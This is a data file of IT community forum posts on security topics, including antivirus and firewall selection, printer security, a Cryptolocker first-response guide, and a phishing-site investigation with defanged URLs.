442109,End Point Protection.,"Greetings and salutations.We are currently having a horrible experience with AVG Cloud Care and are looking for an alternative.These experiences include but are not limited to;1. Locking up servers due to faulty updates. Have to physically restart servers.2. Multiple services running. We count 9 AVG services at a minimum running at once.3. Multiple tray icons displaying.4. Faulty updates that cause licensing issues and GUI crashes.5. No returned calls from AVG Cloud Care technical support.The worst one was when AVG brought an SBS 2011 server to its knees. We uninstalled AVG Cloud Care from the server and during the uninstall process it stripped system DLLS that caused a never ending boot-loop. When we contact AVG Cloud Care they were not helpful at all. They kept repeating that their software does not do that. It wasn't until my boss threatened them with a lawsuit that we were finally able to get some real technical support from them. We also had to get Microsoft technical support involved to help restore the server. Microsoft was very helpful from the start.Just recently AVG Cloud Care has been distributing faulty updates and never ending nag screens. The most recent one is causing several servers to become unresponsive. Were still waiting for a call from their technical support. 3-Days and counting.So, I was able to find Bitdefender Cloud Security. But I would like the community's input on this. ",11

The IT guy before me created generic shared network accounts so the users can all use the same login and password to access the lab computers and our network shared folders.

Now the users are not too happy with the 15 minutes screen lock policy. Some lab applications will not work with multi-users. If someone is using the application and forgot to log off, the next person will have to find him/her or reboot the computer to use the lab application. I have suggested instead of a 15 minutes screen lock, maybe I can do an hour auto logoff of idle account. How do you guys manage your lab environment? ",0

492408,Office IP Camera Suggestions,"This is not really a ""security"" issue or question, but more of an ""information/suggestions needed"" type of question.I am wanting to install an IP camera showing my office.  I currently have several IP security cameras around that I can access remotely, but I want this camera to be accessed from a website so viewers can see the office in a live view.The IP cameras I currently have work fine except that if accessed remotely the user has to login which I don't want; I want them to click the link and immediately view the camera without having to login or anything.I have also tried EarthCam and StreamUp.  EarthCam supports IP cameras but StreamUp does not.  Also, with either the image does not seem as sharp and clear as it should be.  I am using a Logitech 920 1080P camera.  I would prefer an IP camera so that I don't have to keep a box running just for the purpose of the camera.Any suggestions?",0

So over the next couple of days, I wanted to highlight each one and give this group some more details.First up, the NetClarity SNAC integration! This thing is really slick. The way it works is you can add the New Devices widget to your dashboard and when new unknown devices are detected, you can block these devices from communicating with the rest of your network. Oh and you can also do this directly from the Tools menu in your inventory.To see the known and unknown devices on your network and assign devices to owners is all functionality that is just a part of Spiceworks. To use the block features, you will need to have NetClarity installed on your network. To get more details, head over to the NetClarity vendor page. ",11

2130186,Is Malwarebytes worth the money?,"Hello everyone,We're in the market for a new antivirus after repeated issues with our current product. We currently are running Vipre Endpoint Protection and have run into problems with the AV missing infections, and memory leaks in its client causing the majority of our systems to become unresponsive if not very frequently rebooted.I've been shopping around, and one of the products that I've looked at is Malwarebytes Endpoint Protection. I've used Malwarebytes free version on my personal computer and for side jobs for years, and have always been impressed with its ability to find the leftover junk that other products would always seem to miss. But, when it comes to purchasing it for business, they seem to demand quite a hefty price tag compared to other products.I got a quote for Malwarebytes that had it at $56/client. With Vipre, we only paid $9.33/client, so this is quite a price increase. But given all the problems with Vipre, we're certainly willing to pay a little extra for a higher quality product. However, even compared to some other AV options, Malwarebytes seems to be really expensive. For example, Webroot and Avast were quoted at $25/seat, less than half the cost of Malwarebytes.My question to you, for those of you who have used Malwarebytes Endpoint Protection, is whether you feel that it's worth the extra money. What does it do that others don't that demands so much more money per seat? Would you recommend it compared to any other solutions?Thanks! ",0

1557048,Security Tug of War: Cloud Edition,"Cloud security can sometimes feel like a game of tug of war. On one side, you have cloud advocates promoting the cloud as secure and on the other side you have IT and security pundits telling you to stay out of the cloud. While it’s easy to say that best form of cybersecurity is to not be connected at all, the reality is that for businesses to grow and thrive, connection is a necessity. With that reality in mind, it makes more sense to ponder whether connectivity is more securely managed by ourselves or by others. The two largest security threats for any organization? Employees and the number of vulnerabilities. Cloud providers have the ability to both mitigate poor user behavior and take on the responsibility of managing networks, devices, connections, and applications that all have vulnerabilities. While there is always room for improvement for the cloud, the high level of adoption is a clear sign that the cloud is not only secure, but convenient and useful.Are you ready to get on the cloud side of the security tug of war? ﻿",0

If I have the Content Filter configured and the CFS Policy assignment set to ""Via User and Zone Screens"" my Mac Address group in the LAN>WAN doesn't work, I am forced to filter by IP address. I want to allow a MAC Address group to completely bypass the CFS and go to any websites but allow users not in the MAC address group to use an exclusion list, so Facebook is blocked, but allow ""digg.com"", (which both are flagged as social networking) or whatever domain I put in the exclusion list. I know that you can add ""Allowed Domains"">Custom list, when using ""Via User and Zone Screens"", but when ""Via APP Rules"" is selected that dissapers.What is the best practice to allow certain websites through the CFS, as when you select ""Via App Rules"" I can no longer configure the policy? I still need the CFS for ""Social Networking"" in place, need only certain MAC Addresses to bypass the CFS policy entirely, and allow a certain site like ""Digg.com"" which is flagged as ""Social Networking"" through for the entire network.

489042,Automatically secure file shredding,"I have this request from a company I consult for: they want to be sure that a deleted file on a PC is actually deleted (shredded). Okay this is easy at first glance, but it turns out that the problem lies in the details.1. They already cleaned up the critical data from PCs that should not have contained it, and this made my job a bit difficult as files were no longer in the FS. So I decided to securely wipe the drives, and then reinstall the OS. First step down, all nice and dandy.2. Now the tricky part, and the question at hand, what if, by accident or necessity, someone accesses one of the ""critical"" files on one of the cleaned up PCs (opening it from a flash drive or so)? Even if the file gets closed and shredded from the HDD, I suspect it could leave traces in the system.My take was to drop a full-disk encryption on all HDDs (TrueCrypt) and setting the pagefile/Recycle bin/temps to purge on shutdown. Is this enough? I mean, even if someone decrypts the volume, he/she should not be able to recover any of the deleted data (I know this might be a problem in case of data recovery situations, but they are aware of it and accepting the risk).I know that deleting a file only removes it's address. Can it be done to set shredding instead of deleting as a default option in the OS? Can this be done at system level, so the OS initiated deletes are actually shreds? What about the temps Windows always leaves behind?So, the end result is that it should be difficult/impossible to trace deleted files on a PCs HDD, even after decrypting the volume.How would you handle this? I never seriously went into this domain, and just took encryption for granted. So a bit lost at what is really granted and what not.Obs.: Very non-technical users, so the more automagically, the better. :-)Thanks.",0

Beyond triggering a global discussion on the role of government in regards to personal privacy (as well as US foreign cyber relations), the disclosure of Stuxnet has ""triggered changes in industrial control systems products, networks, and methodologies."" But Andrew Ginter at Dark Reading wants to know, ""Did we learn the right lesson?""The short answer: No, but we did learn some things. The central lesson learned following Stuxnet, according to Ginter, is that best practices are called best practices for a reason. Lesson number one: Stuxnet was transmitted by USB drives. After learning this, many took to revising ""procedures to send ... all of our industrial control system (ICS) information through firewalls to control the use of removable media."" The big security lesson here is that it's not just the things outside your walls the can get you – the things inside can sometimes be just as, if not more, dangerous. Lesson number two: Zero-day vulnerabilities were at the bottom of Stuxnet's spread, which went unmonitored for months. While zero-day vulnerabilities are unavoidable, a huge improvement, says Ginter, has been the push for more updates, patches, and security improvements from vendors. Lesson number three: ""Hard-coded passwords [which were used by Siemens S7] are a serious best-practice violation."" While the move to improving passwords has gained momentum over the years, Stuxnet pushed many to hasten ""IT/OT integration and plans and [deploy] ... Active Directory servers to centralize all password policies and password management."" One very tangible effect of this lesson is also visible in today's focus on specialized IT security teams. But even with these three central lessons, Ginter believes we still have a long way to go. Ginter tells a story of an ICS security architect he knew who worked at a company and did everything ""by the book."" After rigorous testing, they had zero vulnerabilities, and were compliant with all ""relevant cyber security standards and regulations."" And then they brought in a penetration tester who proceeded to break into the entire corporate network in five minutes.  When your security systems meet all regulations, have zero vulnerabilities, and are, to a team of security professionals, quite good but fall within five minutes to what Ginter describes as a ""standard targeted attack pattern"" ... well, that's not good. So the real lessons we learned from Stuxnet, Ginter says, is that: (1) every site can be hacked; (2) control networks, which control physical processes, aren't the same as enterprise networks (physical things can't be backed up); and (3) ""attack training is essential to defense."" And the final lesson is that firewalls are no longer what they were ten years ago – we must embrace the new technologies at our disposal as hackers embrace their own. ",11

I've tried to take some of the heat out of our witch-hunt, I fully believe if the system is tight enough, our users could do some pretty liberal web-surfing without causing too many dents, but I have witnessed some users be more susceptible.

2033512,Expert tips on endpoint security: Understand how to stay compliant,"Article found on tektonika.com by Jason O'KeeffeSecurity has become a business-critical, executive-level issue. When HP conducts security assessments, business owners are present in the room, along with the IT team. That way, everyone is there to engage in an executive review. Light bulb moments are frequent among business owners when they see the connection between the loss of data due to poor practices and vulnerabilities. Security can make or break a business and executives are beginning to realize the importance of working together in IT. Having recently worked with a customer on the East Coast of America, assessing their environment and the business, they discovered that the business had minimum to no policy on their printers, anyone could do anything, such as gain administrator access and brick the device; thus putting an $8,000 multi function printer (MFP) totally out of service. What they didn't realize was they'd given administrator rights to a huge amount of people in their organization. On top of this, these administrator rights were generic, meaning the user name could have been ""guest"" and the password was ""guest.""When we explained how that risk could expose private company data, it suddenly clicked with everyone in the room: Part of our role is to educate two departments- IT and senior management and the business owners- on the risk of their data. Organizations aren't taking printer security seriouslyCustomers see printers as a dumb device in the corner with no need for any security focus. Printers are not what they were five years ago, they are extremely intelligent with full operating systems and embedded web servers. Customers think they're protected because they're behind firewalls; however, firewalls are no longer enough to ensure proper defense. When they buy printers today, or an IoT device for that matter, customers need to start thinking about the security that's attached (if there is any) and what configurations they need to make immediately. Hackers are always looking for alternative ways to get into your network, and there's no better way than a printer behind two layers of firewall evndors, IPS, IDS, SIEM, HIPS, etc. Never underestimate a hacker's mindset, they are a creative bunch of people and I've seen firsthand how they can bypass firewalls to reach your printers. It's easier than you think to apply new security standardsSmaller businesses see the security measures required in regulations like PCI, HIPAA, and now, the new GDPR in 2018 as overwhelming challenges. I always tell them that they aren't as difficult as they appear. In fact, it's very easy to translate any standard into specific actions by just reading the regulations or standards and comparing to internal controls they already have in place. At HP, we help customers by translating security standards like PCI, HIPAA, and GDPR and showing them how it applies to their printer infrastructure. Immediately, customers see how they can protect hundrede of thousnad of devices on their network and align themselves to industry regulations. As a result, we've seen plenty of customers and executivews becoming the new security heroes for their business. Stay on top of security regulations by signing up to industry blogsRegulations are constantly changing and being updated, and small buisnesses are unlikely to afford a resource dedicated to monitoring regulations. Stay on top of regulation updates to ensure you stay compliant by subscribing to security newsletters. So your research, sign up, and set up alerts to be the first to find out about the latest majorupdates that could impact your business IT practices. Customers should also talk to theur industry peers and their vendors to ensure any products they buy are aligned to good industry security best practices. Believe it ot not, I am still seeing vendors out there not advising their customers on what I call basic security 101 practices. For example, how many businesses out there have changed the default account names and passwords on devices, like printers, on their networks? Are your printers accessible by the default accounts and passwords form their manufacturer? Do you know you can easily find the manufacturer's default administrator accounts or other accounts tupes on the internet with a simple search?Again, here's a simple security control I like to refer to as security 101 good practices. Be aware, some device vendors out there make it extremely diffficult to change default accounts and passwords. Select products from vendors that make it very easy, almost automatic, to change the administrative passwords. PCI and HIPAA regulations have controls to ensure passwords and administrator activity is tracked, take HIPAA control 164.312(d) from example, which refers to the ability to verify that the person accessing information is that person and not someone else. I have often seen print administrators sharing out generic administrator passwords among tens and sometimes hundreds of people. This means they can have the same generic user name and password, and they often do this because it's ""just easier and saves time.""There is no accountability and traceability here, yet when i work with themto show them how easy it is to implement a security control to align to this HIPAA requirment, they are extremely surprised at the vakyse it brings to their business and security department. Quickly, they become security heroes- this is just one example of a HIPAA control and what it may mean to printers; it's very similar in other regulations. Compliance requires every change to be accounted for and traceableBusinesses are failing to put controls in place that take account of who is doing what across print devices. Printers have multiple access points and businesses need to know whether it’s server access or people who are making administrative changes. Compliance regulations are designed to ensure businesses account for every situation—are they recording who’s accessing their printers?If they’re not, those administrative accounts can be taken, leveraged, and used to exploit those printers. Not only could hackers get access to the printers, but printers can become a platform for moving laterally inside the organization to web servers and databases. In the words of one anonymous IT hacker at Black Hat, “printers were sitting ducks on the network.” Make sure you’ve got accountability and traceability for any action taken with printers.Look at Peter Kim’s book The Hackers Playbook, an excellent book for security. It is somewhat technical, but Peter, who is a leading industry pen tester, really hits home the importance of testing your network for offensive attacks and defensive situations. His book looks at the ways to compromise networks and businesses. Hackers don’t care what the device is—as long as they can get a foothold inside your business.Peter Kim has a quote in the introduction of his book on this point: “I probe around for a multifunction printer and see that it is configured with default passwords. Great, I am in.” And Peter goes on to note, “We’ve compromised a number of companies using printers as our initial foothold. We move laterally from the printer, find Active Directory, query it with an account from the printer, and bingo, we hit gold.”As Peter has done, I have also seen how easy it is to compromise a printer to get a foothold into a network.Businesses must take advantage of new, built in security technology At HP, we’ve built new features into our devices that can detect malware and automatically and instantly reboot to go back into a self-healing mode to make sure the malware doesn’t succeed. HP Sure Start, Runtime Intrusion Detection and Firmware Whitelisting not only protect the device, but these features also collect security intelligence that IT teams can analyze and learn from. This technology helps businesses mature their organizational security.Improve your security by going back to basicsFor any endpoint device on the network, whether it’s a printer or a camera, go back to the basics—start with the protocols. Find out what protocols are being used for both sending and receiving data. It’s very easy to collect that data. If you buy a printer today and put it on your network, that printer will be accessible to a lot of software programs via a large range of protocols. Someone needs to go through those protocols and decide if they need them or don’t. Printers can send data via older, less-secure protocols that can leave data exposed to be captured by anyone.Businesses need to understand what technology is in these devices and how they are communicating, and go through the process of deciding whether to turn a protocol on or off. At HP, we now ship printers with older less-secure protocols turned off. It might be a bit of a nuisance for businesses that have old print applications that require these less-secure protocols, but it adds an extra layer of protection, and from my security perspective I would much prefer to ship a hardened secure device that has protocols locked down and then force IT to turn on what is needed per business requirements.The future of security is consulting expert adviceAt HP, we’re expanding our security consultancy services. We go into organizations and educate them on the risks then help them with securing their infrastructure and addressing compliance requirements. Whether an organization buys 10 printers or 10,000, they need to be aware of how to secure their print infrastructure, ensure they can adequately protect their customers, their company, their data, and at the same time, align to industry regulations and standards.What practices have you implemented in making sure your network is protected from hackers? Have you experienced an incident in which a hacker was able to get into your network via your printer? What would you have done differently to prevent such an attack?",0

I say this because although the data will at times reside on servers in the colo datacenter, it will also be moved to our production facility to be used in our production processes. We are a printing and mailing company. Wouldn't our local systems, physical security, etc. also have to be audited to comply with these standards? The data is only as safe as it's weakest link right? I mean we could have our servers in a highly secure data center, but then have no password policy in place, unencrypted drives, poor physical security and someone could gain access to the servers via our weakness locally.

2106913,Downloaders on Google Play designed to steal Facebook credentials,"Recently, threat researchers at Avast discovered several malicious apps, known as ""downloaders,"" on the Google Play store. These apps were designed to download additional apps -- which pose as system apps -- with the goal of tricking users into giving up their Facebook credentials.We reported these apps to Google immediately and since, the developer accounts have been blocked, but it pays to be aware of how these threats work. Here's the scoop.The particular malicious apps in question pose as various lifestyle apps, such as barcode scanners, voice recorders, or basic games, and were targeted to English and Vietnamese users. Our researchers found that some of these apps do contain at least a few of the features they promise... along with un-wanted code that downloads malware apps.In essence, this may be part of the reason they were able to bypass Google's checks, as they don't actually contain any malware themselves. However, they do communicate with a remote server, which then in turn gives the downloader a package to install on the ""infected"" device.Once the malicious app is dropped by the downloader, it immediately requests admin rights. If denied, it tries to engineer the user into allowing them by displaying annoying fake crash dialogs.Furthermore, it can pose as a legitimate Google Play Services app, or even claim that ""there is something wrong with your Facebook account"" to scare users into giving up their credentials.For the full recap from our Threat Labs, see our official blog. Stay safe out there, and if you, a friend, or co-worker is looking for additional Android protection, we offer it for free :)",11
2173312,Yet another Vishing attempt.  (YAVA),"IBM and RedHat seem to be a hot topic these days.Well,  I got a call yesterday from a lady who said she was with Red Hat Customer Success Team.  I didn't answer because I ""googled"" the number and the results said it was most likely a spam call.Anyway, I check the voice mail and she was wanting a few minutes of my time to talk about renewals.The number she left in the VM was not the number she called from. I did a search for RedHat Customer success team and the first result was a ""sponsored "" listing. It did actually say it was redhat and had a link to the redhat website, but  the number was not. I called this number 3 times, the first time I immediately got a recording ""Just for calling today, you get $100.00!). I hung up and called again. This time it was vacation rentals. I called back a third time and a human answered, and after I asked for RedHat support, he told me they are selling vitamins.Anyway, I then call the lady back on the number she left in the VM, the automated system that answered had the same voice as the lady in the message. I chose a different extension than the one she left. It went to a mailbox and; again, the voice sounded just like the lady who left me a message. I called back again and put in another extension (a few numbers off from the one she provided) and the SAME lady answered. I told her my name and that I was confused as to what was going on. She said she was wanting to talk about our company and what type of equipment we use. I of course didn't answer any of her questions. Instead, I had a question for her. I asked her, ""If you actually work for RedHat, then please tell me: Who recently purchased RedHat?"" She was unable to answer and started making excuses to stall me (maybe while she looked it up). Either way, I called her out on her game and she knew the jig was up.I then called our REAL RedHat Account manager and explained to him what had just happened. He said he has never heard of the RedHat Customer Success Team. And I then provided him with all of the numbers I called and any additional information that may help them identify what was actually happening.In my paranoid brain, I think this is a recon mission where they are ""mining"" information from companies for malicous purposes. Whats that called? VISHING?I always tell my coworkers to NEVER talk to random sales calls and DO NOT provide any details of what we do or what we use. Some may think these calls are harmless, but in my opinion, they are trying to social engineer their way in to find vulnerabilites. Or, perhaps, they want to try to get lucky and maybe someone will pay a ""bill"" to them in error (thinking it is legit).Anyway, like I stated above, I reported it to Redhat. But, I also flagged the search result for ""RedHat customer success team"" in hopes that google will take it down.Crazy times are happening, I am going to put my tin-foil hat back on now.Red Hat ",11
435271,First Response to: Cryptolocker \ Ransomcrypt \ Encryptor,"Greetings Spiceheads of all ages round the world!Remember that line in Beetlegeuse...""whoah...Sandworms...ya hate 'em""  Prrrrretty sure we all feel that way about Cryptolocker and it's extended scumbag family.Our man in Poland Vittorio Cioe authored an excellent piece about how to respond to this menace one it has hit your network.  Dig itFirst Response to: Cryptolocker \ Ransomcrypt \ EncryptorLately it has been noticed an increasing spread of threats which, entering a system by various means are encrypting several files on the attacked system like office documents, database files, e-mail archives, which represent a value for the attacked customer.Those threats generally, after encrypting the files, sometimes delete themselves or propagate through the network.To decrypt the file the hackers generally ask to pay a certain amount of money.In order not to create misunderstandings, customers need to be aware of the following:  encrypted files will remain encrypted.  These should be replaced from a known-good backup (and Enterprises are responsible for regularly backing up their own important data).Symantec products do not decrypt files that have been affected by these threats.Why? The reason is as simple as very often not considered. The majority of these kind of threats is using an RSA public-key cryptography at 1024 or 2048 bits. Despit of a number of commercial tools which are released the truth is such: for large RSA key sizes (in excess of 1024 bits), no efficient method for solving this problem is known (this is the so called ""RSA problem"")To know more about it:http://en.wikipedia.org/wiki/CryptoLockerhttp://en.wikipedia.org/wiki/RSA_(cryptosystem)http://en.wikipedia.org/wiki/RSA_problemAnyway, to pay the hackers is not a solution at all.When a customer pays the hackers, there is no guarantee that the attacker can or will supply a method of unlocking their computer or decrypting their files.  For some variants, Symantec has received reports that the threat was received, the attacker provided a code to allow the threat to un-do the encryption that has been done on the customer’s files. Then, once Symantec updated our detection, the threat .exe is removed (deleted/quarantined) and the un-encryption can no longer continue.When customers pay hackers for threats, such as these, it encourages attackers to continue these tactics and  additional attacks against everyone.Please do not pay the hackers!Additional information about those threatsAdditional information about Ransomware threats [Tech Note]Cryptolocker: A Thriving Menace [Symantec Connect blog post]Cryptolocker Alert: Millions in the UK Targeted in Mass Spam Campaign [Symantec Connect blog post]Cryptolocker Q&A: Menace of the Year [Symantec Connect blog post]​First ResponseIf the infection somehow already entered in our environment, the damage, unfortunately is already done.Anyway, if we identify the threat in a timely manner, we can prevent the threat to spread and contain the damage.Whenever you find a system in your environment which is being infected from this kind of encrypting threat, the first thing to do, even more than in other cases is:Isolate the machine from the network!!Afterwards, you will need to identify the virus finding the executable file and submit it to Symantec Security Response.Contact the Symantec Enterprise Technical Support to know how to submit files:In order to stop the eventual expanding of the threat in your environment, through the Symantec Endpoint Protection, you can use the “Application and Device Control” component to block the execution of that specific file, identifying it through the hash MD5:An alternative way to get the hash MD5Once the threat has been blocked and the incoming new definitions from Symantec will remove the threat we can restore our data from backup.There are many ways to maintain a safe backup of sensible data: each organization can choose the most suitable to its needs. Here an exampleHow to prevent this unpleasant situation to repeat?What the most of the people who faced this kind of threat at least once surely will desire, it is not to face it anymore.To achieve this it is possible to take proactive steps to protect our environment.Disable Auto-Run Enable IPS (Intrusion Prevention System) component:Best practices regarding Intrusion Prevention System technologySymantec Endpoint Protection Manager - Intrusion Prevention - Policies explainedTwo Reasons why IPS is a ""Must Have"" for your Network​Increase the overall securityMoreover, again using the “Application and Device Control” component it is possible, it is possible to harden the overall security of the system with a specific policy:Hardening Symantec Endpoint Protection (SEP) with an Application and Device Control Policy to increase securityHow the Application and Device Control Hardening policy worksAnyway, this is a general mean of prevention, helpful but not specific for this kind of threats.It is always recommended to test the policy accurately before applying it massively to any production environment.Lock your system downSurely effective solution which will protect you from this and other kind of threats, it is to use the Symantec Endpoint Protection feature which is called “System Lockdown”.It is based on the idea that an organization uses a determined and pre-allowed set of application which can be collected and allowed by an administrator, blocking the execution of anything else.This document contains a guide to this feature:  Configuring system lockdownCAUTION! Anyone who would like to implement this feature is invited to test it deeply! An incorrect deployment of the feature can highly compromise the functionality of the systems in object.Granular approach (using Application and Device Control)We can implement an application and device control policy to block the execution of the most common file extensions used by this class of threats, in the paths which are known to be the common launch points.About “Application and Device Control” in general:  Symantec Endpoint Protection Application and Device ControlAttached to this article it is given an example of  policy which can be imported in SEP Manager and it is ready to use.Please keep in mind: before implementing this policy massively in a production environment, test it on a small grouop of machine, verify its compatibility to your needs. Also feel free to customize it as you may find more appropriateWhat are the features of our policy?Blocking  Auto-Run (works out of the box)Blocks  access to script files (works out of the box)Blocks execution from removable drives (the details about the device types should be added. For an example of device ID check hereBlocks the execution of files with extension “.exe”, “.com”, “.scr”, “.pif” from the known launch points of those threats and also from some kinds of archives.Here's the complete list:%appdata%\%appdata%\*\%temp%\%temp%\*\%temp%\rar*\%temp%\7z*\%temp%\wz*\%temp%\*.zip\%iappdata%\%localappdata%\%localappdata%\*\%userprofile%\Local Settings\Application\%userprofile%\Local Settings\Application\*\C:\$Recycle.Bin\C:\$Recycle.Bin\*\Please Note: This policy is going to block whatever file with the listed extension which is executing from the given locations. This may include also genuine third party applications or custom made applications.You can anyway exclude custom application from being blocked adding them in the section “Do not apply to the following processes” located in the condition of the rule.SampleADC_Policy_for_Cryptolocker.zipLots of good stuff in there.  If you have any specific questions, hit me up in the comments or drop me a DM.  I'll reach out to Vittorio or get some other experts if needed.Excelsior!",0
2132004,Small Business Firewall,"Hi,I just bought myself in into a business. This business uses software from a software company that made me a proposition to buy a new firewall to protect the network. The current setup consists now of 2 desktop PC's, a server, a router and a network printer.They proposed me a Sonicwall TZ500 as router, but to me, it looks like that is a total overkill for my current setup. In the past I worked for a company using Sonicwalls (before, during and after the Dell reign).After the Dell Period, i had the feeling that Sonicwall was going backwards instead of forward)So i'm looking toward other proposals (unless someone  convinces me otherwise).Firewalls in the same budget range as a Sonicwall TZ500 are okay, but if a cheaper firewall brings me the same (i won't say no ;-) )If there are i.e. Cisco ASA or a Palo Alto in the same budget range, i have a slight preference for those brands.Or does anyone have a total other proposition?",0

That's working and by design, but they'd like to find out where the Tor traffic is coming within their network. Looking through the Fortigate logs, we find that the source is an internal IP address - the address of a Meraki Access Point. For some reason, instead of seeing the end user / client IP address, the Fortigate only ever see's the Access Point IP address. The Meraki AP is set to Bridged mode, so as far as I know it should be passing along the client IP addresses. Since the firewall only ever reports the Access Point IP address, it's almost as if the Meraki AP's are NAT-ting for the clients. Does the Fortigate / Meraki combination just not play well together?? or is there something else I'm missing? ",11

It was.Next, I wanted to see where the URL in the text message wasredirecting me to. I opened up a browser on my virtual machine, and found thatthe URL, hxxp://bit.do/americanexpress-id, redirected me to hxxp://mcexclusiveclub.com/LogonHandler.Once I put in a fake username and password, I was redirected to hxxp://segurainformatica.com.br/myca/logon/us/action/LogonHandlerAcc/details.htmLet’s try to piece together the phishing attack.We know by visiting mcexclusiveclub.com, that the Wordpress site was clearly compromised by ahacker. The reason we know this, is that when you visit the site, you see anopen directory of files. In addition to the benign files, the site alsocontains the phishing page, plus a file called shell.php, which is detectedby several antivirus companies as malicious.Compromised website, showing shell.phpOnce the hacker got “shell” access, or direct access to thewebserver, he began uploading a website that mimicked the real American Expresssite. They used the initial site to load the login page, then redirect toanother URL, where additional personally identifiable information would berequested. A screenshot of the initial phishing siteThe site hxxp://segurainformatica.com.br happens to berunning Joomla, a content managementsystem, or CMS. More than likely, the owner of the domain has not updatedJoomla and the plugins that it is running, leaving it vulnerable to attacks. A screenshot of the redirected phishing siteIf you were to fill in the information on the phishing page,the hacker would receive an email with your username and password, and all ofthe account information you entered in the form.In efforts to reduce the number of people becoming victimsof this phishing attack, I pulled up the “Whois” report onthe domains, to see if there were any abuse email addresses I could contact.Thankfully, there were abuse email addresses listed, so I have reported thesites, so that they are taken down.Hackers are getting crafty, and we all have to be on alertfor these types of attacks. Emails aren’t the only way hackers are trying toget your personal information and credit card numbers. In addition to thesetext messages, hackers are also pretending to call from actual corporate phonenumbers, impersonating the real credit card company. If they do call you,immediately hang up. Call the number that is listed on the back of your creditcard, to verify the issue.

1032610,Sonicwall and PCI,So I am handling PCI compliance for the first time and could use a little help and/or suggestions. I have a Sonicwall NSA 2600 with the security bundle and all that (almost all the features). The ASV I am dealing with is Aperia  Solutions. From what I can tell they do two seperate scans. The first one passed but I failed the second one with the result inconclusive ip scan. Essentially the firewall is blocking their 2nd high intensity scan and since they were unable to finished their scan I get a fail status. Their recommendation to me is to whitelist their ip and try again (me thinks it negates the purpose of the scan in the first place). My concern is that the IPS engine which overrides the ACL's on sonicwall will still cause the same issue. Could use advice on how to handle this or dispute the case with them if necessary. Or if there is a way I can temporarily modify the sonicwall for the scan to pass? Thanks All! ,0

2010444,Router LED Lights Can Steal Your Data,"Whether your PC is physically connected to a network or not, a router or switch can be used to compromise your data. It seems that now, when it comes to hacks, anything really is possible (even LED lights are vulnerable!). In this case, malware is able to use flashing LED lights to extract binary data — alongside encryption keys, passwords, and files — over the hardware. This means tighter protocols are likely needed when examining the security protections folks already have in place. But when something like this is uncovered, do you review security protocols or wait until it becomes a greater threat? We'd love to hear your thoughts. http://www.zdnet.com/article/youre-not-safe-offline-router-led-lights-can-steal-your-data/",5

330793,Why Your Password Can't be That Long - Why it should,"So, early morning, digging around ars, and I read this headline:Why your password can’t have symbols—or be longer than 16 charactersEven a bank that limits passwords to eight characters defends itself.(link)Now, some of you know I'm a big fan of Passphrases instead of Passwords, initially I took this headline as ""look at these silly little companies that nobody has ever heard of not 'getting' computers  let's laugh at them!""So I start reading the article, and it just doesn't look right, then I scan:Charles Schwab - That's not a little credit union out in the midwest...Microsoft - They're not a soap-maker in Oregon with an AS/400...Evernote - That's not a social networking site for Icelandic figure skaters...AT&TCapitol OneSo you're telling me the customer portals / etc. for all of these companies don't encourage secure passwords? What's the deal with that?After reading and digesting it seems to come down to:Ease of Use (AT&T's decision to not permit symbols other than ""-"" and ""_"")Technical Limitations (Evernote's fear of leading spaces, Microsoft's ""our stuff is old and cranky"" defense)""We're looking into it"" (Schwab's nonsense requirement of between 6 to 8 characters)Ineffectiveness I think this quote from Microsoft really hit me:Microsoft says that most attacks on accounts cannot be defended by password length, and the company adds that password cracking is hardly its biggest problem. “Criminals attempt to victimize our customers in various ways and we’ve found the vast majority of attacks are through phishing, malware infected machines, and the reuse of passwords on third-party sites—none of which are helped by very long passwords,” a Microsoft spokesperson told Ars.So if Microsoft thinks that 16 characters should be the upper limit, why do I personally think that 10 is a reasonable minimum?My argument for passphrases has always been:Higher Security (due to length and forced special characters)Ease of use (since a phrase is natural)(for those that don't know, a passphrase would be either a short sentence or series of words, preferably nonsensical and/or unrelated. An example would be ""It isn't a password!"". XKCD's take on passwords.)So if Microsoft, operators of Hotmail, aren't concerned by password cracking, why should I be concerned about the same for my company?Yes, Living Social just had a major password breach (50M Salted Passwords, mmmmmm salted passwords) and it's now possible to crack any 8 character password with GPGPU in half a day. But in reality these attacks aren't targeted at SMB. Yes, there is going to always be the odd case here and there where someone will target those that ""least expect it"" and that is likely to be SMB/E, and yes, all data is significant, not matter how ""unimportant"" it seems to be to an outsider.But is that where focus should be?I don't think so.Nope, I think it's more important to ensure that everyone knows how to spot phishing attacks. Teach them why they should keep information, no matter how seemingly unimportant, to themselves. Or, if all else fails, to just ""If you see something, say something"".I still think that passphrases are better than passwords, and my users seem to agree. The group that have used them have reported they like it, and find it much easier to change passwords when required (rather than spending 10 minutes trying to change the password without just adding yet another number onto the end). I also find less Post-Its under keyboards with ""Password is Fluffy1973"" written on them (but they might just be hiding them better).So what do you think?What's your policy in the office?How have you ensure compliance?",0

It turned out to be a storage issue but i noticed something. We are running 16 IP cameras on Axis Camera Companion. We are planning on adding at least another 10 cameras in the next few months which would be more than our current VMS supports. So I'm looking for something new. We are currently putting together a list of items needed for next years budget so price isn't too much of a factor yet. Ideally down the road we would like to set up a camera on all the parking lot gates to monitor access into the school via Number plate identification. We also have 2 computer labs with 35 computers each and may possibly add a 3rd in the near future. would be nice to be able to monitor what the students have on their screens at any point in time and have it linked to the camera footage from that respective camera. Facial recognition would be a huge plus but I'm not going to get my hopes up too much on thatI see milestone has a lot of the futures we would like to have. I am just wondering what other options are out there.

1439404,Recommended AV for SMB with provided workstations and BYOD,"We are currently looking for a good AV to place on all of our workstations. To give you an idea about our organization, we have a little more than 150 employees spread out across about 20 sites, but over a thousand contract agents. All employees are working on company provided workstations and we also provide 5-10 workstations per office for the contractors to use if needed. Agents are able to bring their own devices and connect to our network currently for internet and printer access. We are using a Google domain setup for all of our employees and agents.We do not currently have any servers on site, just SonicWalls at each location with a VPN set between each office and the corp office. We do not have an AD set up yet but we do want to do one in the future. The workstations are not entirely consistent with a mix of Win 7, Win 8, and Win 10 with a few Macs thrown here and there.  Currently we do not have any kind of AV setup. Ideally we would want an enforced deal but I am not sure that it would be possible and still allow agents devices to connect. We for sure want to be able to protect our own equipment but also would want a solution for the agent devices that are connecting to our network. Mobile phones/tablets are a concern as well. I know this is a lot but I don't really know where to begin looking and any help would be appreciated. If more info is needed please let me know. ",0

